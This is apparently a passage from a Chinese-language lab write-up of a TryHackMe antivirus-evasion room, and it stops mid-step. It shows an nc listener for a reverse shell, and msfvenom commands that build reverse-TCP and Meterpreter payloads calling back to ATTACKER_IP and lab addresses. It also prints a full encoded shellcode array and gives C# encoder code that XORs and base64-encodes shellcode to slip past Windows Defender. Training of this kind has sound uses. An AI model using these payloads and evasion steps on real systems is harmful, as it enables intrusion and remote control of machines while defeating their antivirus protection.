<p>上述步骤全部准备就绪之后，我们就可以在受害机器上运行我们的stager可执行文件了，stager会连接到AttackBox机器上的HTTPS服务器并会检索shellcode.bin文件，然后将其加载到内存中并在受害机器进行运行。此外，我们还需要预先在AttackBox的终端上设置一个nc监听器，以便成功接受反向shell：</p>
<pre><code class="hljs scss">#在AttackBox中进行操作，此处的端口号 将与我们前面运行msfvenom命令时所指定的端口号保持一致
user<span class="hljs-keyword">@AttackBox</span>$ nc -lvp <span class="hljs-number">5555</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054634.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054635.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054636.png" alt></p>
<h1 id="0x07-编码和加密介绍">0x07 编码和加密介绍</h1>
<h2 id="什么是编码">什么是编码？</h2>
<p>编码是根据编码算法或编码类型将数据从原始状态转变为特定格式的过程，它可以被应用于多种数据类型，例如视频、HTML、URLs和二进制文件(EXE、图像等)。</p>
<p>编码是一个重要的概念，通常可用于各种目的，包括但不限于：</p>
<ul>
<li>程序编译与执行。</li>
<li>数据存储与传输。</li>
<li>文件转换等数据处理。</li>
</ul>
<p>当涉及到AV规避技术时，我们也可以尝试使用编码来隐藏二进制文件中的Shellcode字符串，然而，在实际情况下，编码其实还不足以达到规避AV软件的目的。如今，反病毒软件已经较为智能，AV软件可以分析二进制文件，一旦在其中找到了编码的字符串，就可以对其进行解码以检查原始的文本形式。</p>
<p>我们还可以同时使用两种或两种以上的编码算法，这可以使得AV软件更难以找出隐藏的内容。如下图所示，我们可以将"THM"字符串转换为十六进制表示，然后再使用Base64进行编码，在这种情况下，我们需要确保我们的dropper(植入程序)可以处理此类编码，以便将字符串恢复到其原始状态。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054637.png" alt></p>
<h2 id="什么是加密">什么是加密？</h2>
<p>加密是信息和数据安全的基本要素之一，其重点是防止未经授权的访问和数据操纵。加密过程涉及将明文(未加密的内容)转换成被称为密文的加密版本。如果不知道加密中所使用的算法以及密钥，那么就无法读取或解密密文。</p>
<p>与编码一样，加密技术也可被用于多种目的，例如安全地存储和传输数据以及进行end-to-end(端到端)加密。加密可以以两种方式被使用：在双方之间使用共享密钥或者使用公钥+私钥。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054638.png" alt></p>
<p>有关加密的更多信息，可以参考以下博客文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16747150.html">【THM】Encryption-Crypto 101(加密技术-密码学基础)-学习</a></li>
</ul>
<h2 id="为什么需要了解编码和加密">为什么需要了解编码和加密？</h2>
<p>AV(反病毒)供应商通常会使用静态检测或动态检测技术来实施其反病毒软件，这会将大多数公开的网络安全工具(例如Metasploit等)列入黑名单。因此，在不修改这些公开的网络安全工具所生成的shellcode的情况下，我们所使用的dropper(植入程序)被检测出来的概率就很高。</p>
<p>编码和加密都有助于实现AV规避技术，我们可以对dropper(植入程序)中所使用的Shellcode进行编码/加密，以便在运行时将其隐藏起来，避免其被AV软件发现；而且这两种技术不仅可以用来隐藏Shellcode，还可以用来隐藏函数、变量等。</p>
<p>在本文中，我们将重点关注如何通过加密Shellcode来规避Windows Defender的检测。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054639.png" alt></p>
<h1 id="0x08-shellcode的编码和加密">0x08 Shellcode的编码和加密</h1>
<h2 id="使用msfvenom进行编码">使用MSFVenom进行编码</h2>
<p>虽然Metasploit等公开工具能够提供Payload编码和加密功能，但是AV供应商很了解这些常见的公开工具所构建有效载荷的方式，并能采取相应措施来进行检测。因此，如果我们直接使用msf框架生成的Payload，就可能会轻易地被受害者机器上的AV软件所检测到。</p>
<p>我们简单编码一下msf所生成的Payload，以验证编码之后的Payload能否被AV软件检测到，首先，我们使用以下命令列出msfvenom可用的所有编码器：</p>
<pre><code class="hljs scss">#在AttackBox上
<span class="hljs-selector-id">#Listing</span> Encoders within the Metasploit Framework
user<span class="hljs-keyword">@AttackBox</span>$ msfvenom --list encoders | grep excellent
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</code></pre>
<p>我们可以通过<code>-e</code>(encoder)参数开关来指示想要使用<code>shikata_ga_nai</code>编码器，并且可以继续通过<code>-i</code>(iterations)参数开关来指定我们想要对Payload进行三次编码处理。</p>
<p>tips：encoder-编码器，iterations-迭代次数。</p>
<pre><code class="hljs scss">#在AttackBox上
<span class="hljs-selector-id">#Encoding</span> using the Metasploit Framework (Shikata_ga_nai)
#在实际使用时，请填充ATTACKER_IP值
<span class="hljs-selector-id">#msfvenom</span> -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--platform</span> Windows LHOST=ATTACKER_IP LPORT=<span class="hljs-number">443</span> -<span class="hljs-selector-tag">p</span> windows/shell_reverse_tcp -e x86/shikata_ga_nai -<span class="hljs-selector-tag">b</span> '\x00' -<span class="hljs-selector-tag">i</span> <span class="hljs-number">3</span> -f csharp

Found <span class="hljs-number">1</span> compatible encoders
Attempting to encode payload with <span class="hljs-number">3</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span class="hljs-number">351</span> (iteration=<span class="hljs-number">0</span>)
x86/shikata_ga_nai succeeded with size <span class="hljs-number">378</span> (iteration=<span class="hljs-number">1</span>)
x86/shikata_ga_nai succeeded with size <span class="hljs-number">405</span> (iteration=<span class="hljs-number">2</span>)
x86/shikata_ga_nai chosen with final size <span class="hljs-number">405</span>
Payload size: <span class="hljs-number">405</span> bytes
Final size of csharp file: <span class="hljs-number">2089</span> bytes
byte[] buf = new byte[<span class="hljs-number">405</span>] {<span class="hljs-number">0</span>xda,<span class="hljs-number">0</span>xd9,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x05,<span class="hljs-number">0</span>x27,<span class="hljs-number">0</span>x3f,
<span class="hljs-number">0</span>x45,<span class="hljs-number">0</span>xd9,<span class="hljs-number">0</span>x74,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>xf4,<span class="hljs-number">0</span>x5d,<span class="hljs-number">0</span>x2b,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>xb1,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x55,
<span class="hljs-number">0</span>x19,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xed,<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>x03,<span class="hljs-number">0</span>x55,<span class="hljs-number">0</span>x15,<span class="hljs-number">0</span>xe7,<span class="hljs-number">0</span>xd2,<span class="hljs-number">0</span>xe4,<span class="hljs-number">0</span>x8c,<span class="hljs-number">0</span>x3e,
<span class="hljs-number">0</span>x68,<span class="hljs-number">0</span>x3f,<span class="hljs-number">0</span>xfb,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>xf2,<span class="hljs-number">0</span>xc3,<span class="hljs-number">0</span>xd3,<span class="hljs-number">0</span>x23,<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x52,
<span class="hljs-number">0</span>xeb,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>xcf,<span class="hljs-number">0</span>x8e,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x2d,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>xb6,<span class="hljs-number">0</span>x0b,<span class="hljs-number">0</span>x09,
<span class="hljs-number">0</span>xcb,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x1a,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>x55,<span class="hljs-number">0</span>x62,<span class="hljs-number">0</span>xae,<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>x62,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x09,<span class="hljs-number">0</span>xd8,
<span class="hljs-number">0</span>x71,<span class="hljs-number">0</span>x7c,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xae,<span class="hljs-number">0</span>x2e,<span class="hljs-number">0</span>x8d,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>x07,<span class="hljs-number">0</span>xb6,<span class="hljs-number">0</span>x6c,<span class="hljs-number">0</span>x11,<span class="hljs-number">0</span>x63,
<span class="hljs-number">0</span>xf6,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>x14,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>xca,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x14,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>xb1,<span class="hljs-number">0</span>xec,
<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>x27,<span class="hljs-number">0</span>x13,<span class="hljs-number">0</span>x5e,<span class="hljs-number">0</span>xf8,<span class="hljs-number">0</span>x64,
<span class="hljs-number">0</span>xb3,<span class="hljs-number">0</span>xcc,<span class="hljs-number">0</span>xf6,<span class="hljs-number">0</span>xd9,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>x69,<span class="hljs-number">0</span>x63,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x17,<span class="hljs-number">0</span>xbd,
<span class="hljs-number">0</span>xca,<span class="hljs-number">0</span>xe4,<span class="hljs-number">0</span>x1a,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>xcf,<span class="hljs-number">0</span>x14,<span class="hljs-number">0</span>x1d,<span class="hljs-number">0</span>x2e,<span class="hljs-number">0</span>x98,<span class="hljs-number">0</span>xfc,
<span class="hljs-number">0</span>xdb,<span class="hljs-number">0</span>x69,<span class="hljs-number">0</span>x27,<span class="hljs-number">0</span>x37,<span class="hljs-number">0</span>x21,<span class="hljs-number">0</span>x46,<span class="hljs-number">0</span>xf6,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x0c,<span class="hljs-number">0</span>x1a,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x9c,
<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>x22,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>xcc,<span class="hljs-number">0</span>x3a,<span class="hljs-number">0</span>x6d,<span class="hljs-number">0</span>x4b,<span class="hljs-number">0</span>x8e,<span class="hljs-number">0</span>x8d,<span class="hljs-number">0</span>xb0,<span class="hljs-number">0</span>x9f,
<span class="hljs-number">0</span>x6c,<span class="hljs-number">0</span>x97,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xeb,<span class="hljs-number">0</span>xda,<span class="hljs-number">0</span>x43,<span class="hljs-number">0</span>x2b,<span class="hljs-number">0</span>xbe,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>x82,<span class="hljs-number">0</span>x0c,
<span class="hljs-number">0</span>x8f,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>xc7,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>xd4,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>xcb,<span class="hljs-number">0</span>xb0,
<span class="hljs-number">0</span>xd8,<span class="hljs-number">0</span>x35,<span class="hljs-number">0</span>xdd,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>x1c,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xac,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>xa5,<span class="hljs-number">0</span>x3d,
<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x82,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>x3d,<span class="hljs-number">0</span>x26,<span class="hljs-number">0</span>xc3,<span class="hljs-number">0</span>xde,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x16,<span class="hljs-number">0</span>x11,<span class="hljs-number">0</span>x80,
<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x1c,<span class="hljs-number">0</span>x03,<span class="hljs-number">0</span>xf1,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>xb6,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>x62,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>x5c,<span class="hljs-number">0</span>x5f,
<span class="hljs-number">0</span>x35,<span class="hljs-number">0</span>x8e,<span class="hljs-number">0</span>x97,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>xf8,<span class="hljs-number">0</span>xf9,<span class="hljs-number">0</span>x4f,<span class="hljs-number">0</span>x16,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x1e,<span class="hljs-number">0</span>x8b,
<span class="hljs-number">0</span>x17,<span class="hljs-number">0</span>x14,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>x6c,<span class="hljs-number">0</span>x15,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>xe9,<span class="hljs-number">0</span>xce,<span class="hljs-number">0</span>x16,<span class="hljs-number">0</span>x4b,<span class="hljs-number">0</span>xc5,<span class="hljs-number">0</span>x38,
<span class="hljs-number">0</span>xd4,<span class="hljs-number">0</span>xf6,<span class="hljs-number">0</span>xd1,<span class="hljs-number">0</span>x38,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x69,<span class="hljs-number">0</span>xb4,<span class="hljs-number">0</span>xe3,<span class="hljs-number">0</span>xd1,<span class="hljs-number">0</span>xdc,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x9b,
<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>xed,<span class="hljs-number">0</span>x54,<span class="hljs-number">0</span>xbe,<span class="hljs-number">0</span>x0e,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>xdc,<span class="hljs-number">0</span>x92,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>x42,<span class="hljs-number">0</span>x09,<span class="hljs-number">0</span>x4d,
<span class="hljs-number">0</span>xb4,<span class="hljs-number">0</span>xa3,<span class="hljs-number">0</span>xea,<span class="hljs-number">0</span>x3f,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x9f,<span class="hljs-number">0</span>x15,<span class="hljs-number">0</span>x37,<span class="hljs-number">0</span>xe9,<span class="hljs-number">0</span>xef,<span class="hljs-number">0</span>x02,
<span class="hljs-number">0</span>xbf,<span class="hljs-number">0</span>xaf,<span class="hljs-number">0</span>x3d,<span class="hljs-number">0</span>x5c,<span class="hljs-number">0</span>xdf,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x6f,<span class="hljs-number">0</span>xe1,<span class="hljs-number">0</span>x39,<span class="hljs-number">0</span>x63,<span class="hljs-number">0</span>x6b,<span class="hljs-number">0</span>x4d,
<span class="hljs-number">0</span>x4e,<span class="hljs-number">0</span>x2b,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>xdd,<span class="hljs-number">0</span>xec,<span class="hljs-number">0</span>xdf,<span class="hljs-number">0</span>xe5,<span class="hljs-number">0</span>x0c,<span class="hljs-number">0</span>x97,<span class="hljs-number">0</span>xf2,<span class="hljs-number">0</span>xec,
<span class="hljs-number">0</span>x8c,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>xb4,<span class="hljs-number">0</span>x71,<span class="hljs-number">0</span>x92,<span class="hljs-number">0</span>xc7,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x22,<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>x3d,
<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>xfa,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>xd6,<span class="hljs-number">0</span>xd6,<span class="hljs-number">0</span>x6d,<span class="hljs-number">0</span>x19,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xb6,<span class="hljs-number">0</span>xb1,
<span class="hljs-number">0</span>x91,<span class="hljs-number">0</span>xde,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>xcc,<span class="hljs-number">0</span>xdd,<span class="hljs-number">0</span>x46,<span class="hljs-number">0</span>xca,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x90,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x75,
<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>xa2,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>xfd,<span class="hljs-number">0</span>x91,<span class="hljs-number">0</span>xe6,<span class="hljs-number">0</span>x1f,<span class="hljs-number">0</span>xe6,<span class="hljs-number">0</span>x82,
<span class="hljs-number">0</span>xf1,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x93,<span class="hljs-number">0</span>xb4,<span class="hljs-number">0</span>x38,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>x1a,<span class="hljs-number">0</span>x3b,<span class="hljs-number">0</span>xe5,<span class="hljs-number">0</span>x54,<span class="hljs-number">0</span>x0f,
<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>x2b,<span class="hljs-number">0</span>xbc,<span class="hljs-number">0</span>xed,<span class="hljs-number">0</span>x1b,<span class="hljs-number">0</span>x8e,<span class="hljs-number">0</span>x45,<span class="hljs-number">0</span>x6d,<span class="hljs-number">0</span>x0b,<span class="hljs-number">0</span>xe5,<span class="hljs-number">0</span>x15,
<span class="hljs-number">0</span>xbf,<span class="hljs-number">0</span>x21,<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>xa3,<span class="hljs-number">0</span>xc6,<span class="hljs-number">0</span>xb4,<span class="hljs-number">0</span>xb9,<span class="hljs-number">0</span>xd2,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xb0,<span class="hljs-number">0</span>x03,<span class="hljs-number">0</span>x3c,
<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>xaf,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>xa1,<span class="hljs-number">0</span>x1a,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>xa7,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>x45,<span class="hljs-number">0</span>xbf,
<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x63,<span class="hljs-number">0</span>x6c,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>x74,<span class="hljs-number">0</span>xda,<span class="hljs-number">0</span>xa4,<span class="hljs-number">0</span>xdb,<span class="hljs-number">0</span>xa8,<span class="hljs-number">0</span>x72,
<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>xf2,<span class="hljs-number">0</span>x66};</code></pre>
<p>我们可以略微修改上述命令以生成经过编码处理的可执行的Payload文件，然后把该文件上传至THM Antivirus检查器页面(http://MACHINE_IP/)。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -a x86 --platform Windows LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">202.108</span> LPORT=<span class="hljs-number">443</span> -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b <span class="hljs-string">'\x00'</span> -i <span class="hljs-number">3</span> -f exe -o EncPayload.exe
Found <span class="hljs-number">1</span> compatible encoders
Attempting to encode payload with <span class="hljs-number">3</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span class="hljs-number">351</span> (iteration=<span class="hljs-number">0</span>)
x86/shikata_ga_nai succeeded with size <span class="hljs-number">378</span> (iteration=<span class="hljs-number">1</span>)
x86/shikata_ga_nai succeeded with size <span class="hljs-number">405</span> (iteration=<span class="hljs-number">2</span>)
x86/shikata_ga_nai chosen with final size <span class="hljs-number">405</span>
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">405</span> bytes
Final size of exe <span class="hljs-attribute">file</span>: <span class="hljs-number">73802</span> bytes
Saved <span class="hljs-attribute">as</span>: EncPayload.exe</code></pre>
<p>tisp：我们可以在攻击机上通过&nbsp;<a target="_blank" rel="noopener" href="http://10.10.216.13/">http://10.10.216.13/</a>&nbsp;访问THM Antivirus检查器页面。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054640.png" alt></p>
<p>我们发现简单地对Payload进行编码并不能有效地规避AV检测，所以接下来我们将尝试对Payload进行加密处理。</p>
<h2 id="使用msfvenom进行加密">使用MSFVenom进行加密</h2>
<p>通过使用msfvenom，我们可以轻松地得到已加密的有效载荷，首先，我们可以使用以下命令来列出msf中可用的加密算法：</p>
<pre><code class="hljs scss">#在AttackBox机器中
<span class="hljs-selector-id">#Listing</span> encryption modules within the Metasploit Framework
user<span class="hljs-keyword">@AttackBox</span>$ msfvenom --list encrypt
Framework Encryption Formats [--encrypt &lt;value&gt;]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor</code></pre>
<p>让我们构建一个经过XOR加密的有效载荷，注意在使用此类型的算法时，我们还需要指定一个密钥：</p>
<pre><code class="hljs scss">#在AttackBox机器中
<span class="hljs-selector-id">#Xoring</span> Shellcode using the Metasploit Framework
#在实际使用以下命令时，请填充ATTACKER_IP值
<span class="hljs-selector-id">#msfvenom</span> -<span class="hljs-selector-tag">p</span> windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">7788</span> -f exe <span class="hljs-attr">--encrypt</span> xor <span class="hljs-attr">--encrypt-key</span> "MyZekr3tKey***" -o xored-revshell<span class="hljs-selector-class">.exe</span>

user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.14</span>.<span class="hljs-number">79.125</span> LPORT=<span class="hljs-number">5555</span> -f exe --encrypt xor --encrypt-key <span class="hljs-string">"MyZekr3tKey***"</span> -o xored-revshell.exe
[-] No platform was selected, choosing <span class="hljs-attribute">Msf</span>::<span class="hljs-attribute">Module</span>::<span class="hljs-attribute">Platform</span>::Windows from the payload
[-] No arch selected, selecting <span class="hljs-attribute">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">510</span> bytes
Final size of exe <span class="hljs-attribute">file</span>: <span class="hljs-number">7168</span> bytes
Saved <span class="hljs-attribute">as</span>: xored-revshell.exe</code></pre>
<p>我们再次将生成的Payload文件上传到THM Antivirus检查器页面(http://MACHINE_IP/)，我们会发现Payload依然会被AV所标记，原因可能是：AV供应商做好了足够充足的准备来确保其AV产品能够检测到常见的msfvenom payloads。</p>
<p>tisp：我们可以在攻击机上通过&nbsp;<a target="_blank" rel="noopener" href="http://10.10.216.13/">http://10.10.216.13/</a>&nbsp;访问THM Antivirus检查器页面。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054641.png" alt></p>
<h2 id="创建自定义有效载荷">创建自定义有效载荷</h2>
<p>既然简单的编码和加密都无法有效地规避AV检测，那么我们接下来将会尝试使用我们自己定义的编码方案，这样反病毒软件就可能不知道如何分析我们的有效载荷。</p>
<p>请注意，在此我们不必做任何太复杂的事情，只要得到的Payload足以让AV进行分析即可；接下来，我们将采用XOR和Base64的组合来处理由msfvenom所生成的简单反向shell Payload，以此尝试绕过Defender。</p>
<p>让我们首先使用msfvenom生成适配CSharp的反向shell Shellcode：</p>
<pre><code class="hljs scss">#在AttackBox机器中
<span class="hljs-selector-id">#Generate</span> <span class="hljs-selector-tag">a</span> CSharp shellcode Format
#在实际使用命令时，请填充ATTACKER_IP值
user<span class="hljs-keyword">@AttackBox</span>$ msfvenom LHOST=ATTACKER_IP LPORT=<span class="hljs-number">443</span> -p windows/x64/shell_reverse_tcp -f csharp</code></pre>
<h2 id="编码器">编码器</h2>
<p>在构建实际的有效载荷之前，我们将创建一个编码器程序，该程序将采用msfvenom生成的shellcode并会以我们想要的方式对其进行编码。在此编码器程序中，我们首先会使用自定义密钥对Shellcode进行XOR加密处理，然后再继续使用base64对其进行编码处理。</p>
<p>下面是编码器的完整代码示例，该代码文件可以在目标Windows机器中的以下路径找到：<code>C:\Tools\CS Files\Encryptor.cs</code></p>
<pre><code class="hljs cs"><span class="hljs-comment">//在目标Windows机器中创建该代码文件</span>
<span class="hljs-comment">//Encryptor.cs</span>
<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Collections.Generic;
<span class="hljs-keyword">using</span> System.Linq;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Threading.Tasks;

<span class="hljs-keyword">namespace</span> <span class="hljs-title">Encrypter</span>
{
    <span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
    {
        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">xor</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] shell, <span class="hljs-built_in">byte</span>[] KeyBytes</span>)</span>
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            <span class="hljs-keyword">return</span> shell;
        }
        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span>
        {
            <span class="hljs-comment">//XOR Key - It has to be the same in the Droppr for Decrypting</span>
            <span class="hljs-built_in">string</span> key = <span class="hljs-string">"THMK3y123!"</span>;

            <span class="hljs-comment">//Convert Key into bytes</span>
            <span class="hljs-built_in">byte</span>[] keyBytes = Encoding.ASCII.GetBytes(key);

            <span class="hljs-comment">//Original Shellcode here (csharp format)</span>
            <span class="hljs-built_in">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">460</span>] { <span class="hljs-number">0xfc</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x83</span>,..,<span class="hljs-number">0xda</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd5</span> };

            <span class="hljs-comment">//XORing byte by byte and saving into a new array of bytes</span>
            <span class="hljs-built_in">byte</span>[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}</code></pre>
<p>在实际使用时，我们只需要将msfvenom所生成的Shellcode填充到上述编码器代码中的<code>buf</code>变量处，然后再对目标机上的编码器代码文件进行编译、执行即可。</p>
<p>我们可以在目标Windows机器上使用以下命令来编译并执行编码器：</p>
<pre><code class="hljs scss">#在目标Windows机器中
